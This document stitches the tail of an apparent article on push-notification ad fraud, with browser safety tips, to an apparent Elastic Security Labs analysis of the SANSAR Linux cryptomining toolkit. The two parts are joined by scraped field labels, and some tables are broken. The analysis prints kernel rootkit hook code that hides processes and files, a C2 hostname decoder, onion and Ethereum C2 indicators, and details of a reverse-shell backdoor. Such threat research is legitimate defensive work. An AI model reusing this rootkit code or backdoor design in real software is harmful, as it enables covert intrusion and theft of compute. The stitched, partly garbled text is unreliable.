For context: HUMAN Security’s Satori researchers observed roughly 240 million advertising bid requests associated with Pushpaganda domains in a single seven-day period at the operation’s peak.

A bid request asks advertisers in real-time to bid for an opportunity to show an ad. In a push notification ad auction, the winning ad is sent as a notification to someone who has allowed them.

Note the dip after the reports came out. It takes time to rebuild the infrastructure, but criminals will do so if they think it’s worth the investment.

How to stay safe

Allow notifications only when you want ongoing messages from a site. A few guidelines that may help you:

Don’t click on prompts until you’re sure what they will set in motion.

Treat “Allow notifications to continue” as a red flag, particularly on quizzes, video pages, or unfamiliar websites.

Use web protection. Malwarebytes Browser Guard is a free tool that can help block malicious websites.

If you’re haunted by unwanted alerts, they might be web push notifications. Here’s how to identify the website sending them and turn them off in several popular browsers.

On supported Android devices, Chrome notifications include an Unsubscribe option. Use that built-in control rather than a link inside a suspicious message. When you receive an unwanted website notification through Chrome on Android:

Swipe down from the top of the screen to open Android’s notification shade.

Look for an Unsubscribe action on the notification.

If it is present, tap it to stop future notifications from that website. Chrome also provides Undo if you unsubscribe accidentally.

If Unsubscribe is not present, open Chrome and go to More > Settings > Site settings > Notifications. Review the allowed websites and block the offending site. You don’t need to follow a link in the suspicious notification to manage its permission.

Attacks, Breaches & Threat Intel.title: 0% GPU utilization: How SANSAR hides Linux cryptomining
Attacks, Breaches & Threat Intel.context: Elastic Security Labs is tracking REF3364, a Linux cryptomining intrusion that combines custom malware with publicly available miners
Attacks, Breaches & Threat Intel.full_text:
Elastic Security Labs is tracking REF3364, a Linux cryptomining intrusion that combines custom malware with publicly available miners. The toolkit includes SANSAR, a Rust orchestrator that receives commands over Tor (The Onion Router) used to manage CPU and GPU miners.

The threat actor also deployed a kernel rootkit to hide selected processes and files, an NVIDIA Management Library (NVML) wrapper to falsify GPU readings, and a separate backdoor named netns. This backdoor retrieves its C2 address from an Ethereum smart contract before connecting to the server directly.

The use of public blockchains to locate C2 infrastructure is a pattern we also discussed in our 2026 Threat Command quarterly report.

Key takeaways

The actor abused an exposed Ray job agent, obtaining root and deploying the toolkit across three Linux GPU hosts.

SANSAR uses Tor for C2 and supervises CPU and GPU miners.

SANSAR’s command handlers support miner configuration and interactive shells.

The NVIDIA Management Library (NVML) wrapper falsifies GPU readings, while the kernel rootkit hides selected processes, files and socket entries.

Initial access: an exposed Ray job agent

The attacker compromised the first host through an exposed Ray job agent. Ray is an open-source framework for distributing Python workloads, including AI model training and inference, across multiple machines. Its Jobs API lets users submit commands to run applications on the cluster.

On that host, the dashboard on Ray's head node listened only on the local loopback interface. The job agent remained reachable from the internet and accepted job submissions without authentication. The attacker used this interface to execute commands through Ray.

Between October 22 and 25, 2026, the recorded activity progressed from external probing to persistent access:

October 22, 2026: external probes first appeared in the Ray logs.

October 24, 2026: a submitted job ran the NVIDIA System Management Interface (nvidia-smi) and sent the GPU inventory to an external server.

October 25, 2026: the actor submitted a Python reverse-shell job that connected to an external listener.

The reverse shell ran under the local account that owned the Ray session. The actor subsequently added an SSH key to that account’s authorized_keys file to establish persistent access.

Inside the SANSAR Linux cryptomining toolkit

Toolkit deployment

After obtaining root, the actor staged the toolkit under /opt/vadi_, built the acpi_thermal_mgr kernel module through Dynamic Kernel Module Support (DKMS) and added an initramfs loader. An initramfs is a temporary root filesystem loaded into RAM during early boot, before Linux switches to its normal root filesystem. The module and loader are stored in the boot image on disk, so the rootkit can load again when the host boots with that image.

The installation also replaced the NVML library and registered the separate netns backdoor as a systemd service.

The GPU miner arrived later on two hosts. A kernel log records /opt/vadi_/tilki starting on one machine; cache creation and new GPU contexts support execution on the other system.

The following is a table identifying the files deployed on the machines:

File

Identification

Role

sansar

Rust client, version 0.1.3

Tor C2, host inventory, miner supervision, shell and traffic tasks, NVML-hook maintenance

kurt

XMRig 6.25.0

Miner selected by SANSAR's CPU branch; consumes external pool configuration

tilki

SRBMiner-MULTI 3.6.9

Miner selected by SANSAR's GPU branch

lyrebird

nvml-hook/libnvidia-ml.so.1

acpi_thermal_mgr.ko

Ethereum-assisted backdoor

Retrieves a controller IPv4 address and handles reverse-shell requests over TCP

The collected tilki has the same SHA-256 hash as the executable in the official SRBMiner-MULTI 3.6.9 Linux release.

The diagram below shows the toolkit’s components, SANSAR’s Tor control channel and the separate netns backdoor’s use of Ethereum to retrieve its C2 address:

SANSAR analysis: anti-debugging and the encoded onion C2 domain

The name SANSAR comes from its filename and the sansar-client v0.1.3 version string.

Before setting up the connection, SANSAR performs an anti-debugging check by reading /proc/self/status and exits if TracerPid is nonzero. It also records the time for a 1,000-iteration loop and exits if it takes 501 milliseconds or longer.

The controller hostname is stored as 62 encoded bytes. We reproduced the decoder offline: each byte is rotated right by (i % 7) + 1, then XORed with a byte from a repeating 32-byte mask.

plaintext[i] = ROR8(ciphertext[i], (i % 7) + 1) XOR mask[i % 32]

Which results to the following domain with a hardcoded port value of 9051:

efxisnqldelyr5ra25oqfrsut54b34g26e7zrsiuupsoekjof2gho2id.onion:9051

SANSAR uses this onion service for C2 communication, receiving commands, reporting host inventory and obtaining the miner’s status.

Tor client initialization

SANSAR uses Arti, the Tor Project's Rust implementation of Tor, as a library for its C2 connection. It resolves its supporting paths relative to the executable directory. These include:

arti_data/state

arti_data/cache

bridges

.client_id

lyrebird

The bridges file lists alternative entry points into Tor. Bridges are relays whose addresses are not listed in the public relay directory and can help clients reach Tor when direct connections are blocked. The collected file contains seven WebTunnel entries and three obfs4 entries.

Sansar supports two Tor connection modes. Direct mode connects through Arti without Lyrebird. Bridge mode uses Lyrebird to reach Tor through the configured WebTunnel or obfs4 bridges. Both modes connect to the same onion C2. Their initial bootstrap deadlines are 60 and 900 seconds, respectively.

Host and GPU enumeration

SANSAR collects GPU information with the following command:

nvidia-smi --query-gpu=name --format=csv,noheader

SANSAR uses the startup result to decide whether a GPU miner can be launched. It repeats the query during registration and sends both GPU inventories to the C2, together with the logical CPU count.

Collection

Periodic host status

/proc/uptime, who, /proc/loadavg

To establish the host’s public IP, SANSAR queries four external services in order, with a five-second deadline per attempt, stopping at the first valid response:

api.ipify.org

ifconfig.me/ip

icanhazip.com

checkip.amazonaws.com

Registration, HMAC authentication and heartbeats

SANSAR sends a 40-byte authentication field during registration: a timestamp followed by an HMAC-SHA256 digest. It calculates the digest from the client ID followed by the timestamp, using a key embedded in the binary. Host inventory is not included in the calculation.

timestamp = BE64(unix_seconds) authentication = timestamp || HMAC-SHA256(K, client_id_bytes || timestamp)

Heartbeats report how long SANSAR has been running, its Tor connection mode (direct or bridge) and the number of successful reconnects. They can also report how many bridges were tested, how many were healthy and when the last test ran.

SANSAR’s binary C2 message protocol over Tor

SANSAR exchanges binary messages over its Tor connection. Each frame starts with a four-byte big-endian body length, followed by a four-byte little-endian message type and the payload for that type. The length covers the type and payload, excluding the length field itself.

typedef struct { uint8_t body_length[4]; uint8_t message_type_id[4]; uint8_t payload[]; } sansar_c2_comm_frame;

An illustrative ShellData frame carrying whoami followed by a newline would contain:

Field

Size

Value

Body length

4 bytes

27

4 bytes

8 bytes

Identifies the existing shell

The 16 C2 command types SANSAR handles

SANSAR handles 16 incoming message types covering registration, connection management, interactive shells, traffic generation and miner control.

General command handlers

ReportVersion returns sansar-client v0.1.3. The Restart handler replies with success and Restart initiated, then returns to message processing without restarting SANSAR. Custom returns an unknown-command error without executing the supplied command or arguments.

Interactive shells in a pseudo-terminal

ShellOpen starts /bin/bash --norc --noprofile in a pseudo-terminal. It sets HISTFILE=/dev/null and zeroes the history-size variables to suppress saved shell history. A session ID links subsequent input, resize and close requests to the correct terminal. SANSAR forwards the terminal's output to the C2.

CPU and GPU miner management

The C2 sends a MinerStart message to SANSAR with the settings for a mining job: the pool address, wallet or pool login, optional algorithm, extra command-line arguments and proxy flag. SANSAR saves this configuration and uses it to build the miner's command line. Its launch paths provide no hardcoded fallback for the pool or wallet/login.

The message also includes a miner ID, which identifies the managed miner in later update, stop and output requests. A separate miner_type field selects the executable:

Value

Miner type

Internal name

Executable

0

GPU

GpuWildrig

tilki (SRBMiner-MULTI)

1

CPU

CpuXmrig

kurt (XMRig)

The C2 can later send SANSAR a MinerConfigUpdate message with the miner ID and replacement settings. SANSAR changes only the supplied fields.

How the NVML wrapper fakes GPU utilization

NVML is the user-space management library used by nvidia-smi. The collected libnvidia-ml.so.1 wraps that interface. Its hooks call the genuine NVIDIA library, then change selected results before returning them to the caller. NVIDIA's NVML header defines the interface and its structures.

The recovered /opt/vadi_/nvml-hook/ directory contains nvml_hook.c and a Makefile. SANSAR's maintenance task locates this source directory and can run make followed by make install to build and install the wrapper. The Makefile uses ldconfig to locate the NVIDIA library directory and replaces its libnvidia-ml.so.1 with the wrapper. It leaves the genuine versioned library in place for backend calls and creates /usr/lib/.libnvidia-ml.so.1.backup if no backup exists.

The wrapper hooks NVML calls used by monitoring tools such as nvidia-smi. It forwards queries to the genuine NVIDIA library, then alters selected results: GPU utilization is reported as 0%, while temperature and power are replaced with random readings of 36 to 46 degrees Celsius and 100 to 200 watts.

How the acpi_thermal_mgr rootkit conceals cryptomining activity on Linux

acpi_thermal_mgr.ko uses Function Tracer (ftrace) to intercept system calls such as getdents64 for directory listings, openat for file access and kill for signals, along with the kernel routines that produce TCP and UDP socket listings. Its handlers remove matching entries or reject requests involving hidden processes and files.

The collected files included the module's C source, acpi_thermal_mgr.c, under /usr/src/acpi_thermal_mgr-1.0/. The source also contains Turkish comments, including Tüm gizli isimleri kontrol et ("Check all hidden names").

Its module’s parameters control process and file concealment, module self-hiding and the executable paths used by its watchdog.

kurt and lyrebird are compiled into the module as default process names. The remaining process names, filename prefix and client paths start empty, and module self-hiding is disabled by default. These defaults can be overridden through module parameters supplied when the module is loaded.

How the rootkit filters processes and files

The module hides processes whose names match its configuration. It also hides their worker threads, even when those threads use different names.

The getdents and getdents64 hooks rewrite directory records returned by the original syscall. When a program lists /proc, they omit entries for hidden PIDs. In hook_getdents64, a matching first record is removed from the buffer; later matches are skipped by extending the preceding record:

offset = 0; prev = NULL; while (offset < ret) { cur = (void *)kdirent + offset; if (should_hide_dirent(cur->d_name, strlen(cur->d_name))) { if (!prev) { ret -= cur->d_reclen; memmove(cur, (void *)cur + cur->d_reclen, ret - offset); continue; } prev->d_reclen += cur->d_reclen; } else { prev = cur; } offset += cur->d_reclen; } copy_to_user(udirent, kdirent, ret);

Other hooks block direct inspection. open and openat return ENOENT ("No such file or directory") for hidden /proc/<pid> paths. Selected metadata and link queries apply the same path check, while PID queries such as sched_getaffinity return ESRCH ("No such process").

When hide_prefix is set, the directory hooks also omit file and directory names that begin with that prefix. The open and openat hooks reject paths whose final component matches it. The checks in hook_openat are:

fn[PATH_MAX - 1] = '\0'; if (is_proc_path_hidden(fn)) { kfree(fn); return -ENOENT; } bn = strrchr(fn, '/'); bn = bn ? bn + 1 : fn; if (is_file_hidden(bn, strlen(bn))) { kfree(fn); return -ENOENT; } kfree(fn); return orig_openat(regs);

The kill hook also normally returns ESRCH for hidden PIDs. It forwards the request to the original syscall when the caller's name matches hide_name, allowing the configured manager to signal hidden processes:

if (is_pid_hidden(pid)) { /* Sansar (ana süreç) kendi çocuk süreçlerini yönetebilmeli. * Çağıran sürecin comm'u hide_name (sansar) ise kill'e izin ver. */ get_task_comm(caller_comm, current); if (hide_name[0] && strncmp(caller_comm, hide_name, TASK_COMM_LEN) == 0) return orig_kill(regs); return -ESRCH; } return orig_kill(regs);

If hide_module is enabled at load time, initialization removes the module's entry from the kernel module list and its sysfs object.

Netns: the backdoor that resolves its C2 from Ethereum

To locate its controller, netns sends eth_call requests over HTTPS through public Ethereum RPC services to the embedded contract 0x43eb291f56688c63c93e8a93c4591fc997cf6349, using selector 0x6ded96e7. The response is expected to contain an encoded IPv4 address. netns decodes it and attempts a plain TCP connection to that address on port 8080.

Once netns connects to the controller on port 8080, the controller can send a text command in the form SHELL <host> <port>. netns parses the destination, forks a child process and starts Bash, which opens a separate outbound connection to the supplied host and port. That destination can differ from the controller address retrieved from Ethereum. The command loop has no application authentication or integrity check.

Conclusion: What this means for GPU and AI infrastructure

SANSAR manages CPU and GPU miners over Tor. The kernel rootkit hides selected processes and socket entries, while the NVML wrapper falsifies GPU readings.

The separate netns backdoor provides shell access and retrieves its controller address from Ethereum. We documented similar blockchain-based C2 discovery in our 2026 PHANTOMPULSE research.

Organizations expanding GPU infrastructure for AI and LLM workloads should check who can submit jobs and whether GPU monitoring libraries have been modified, as cryptojacking can divert compute capacity from legitimate workloads and increase operating costs.
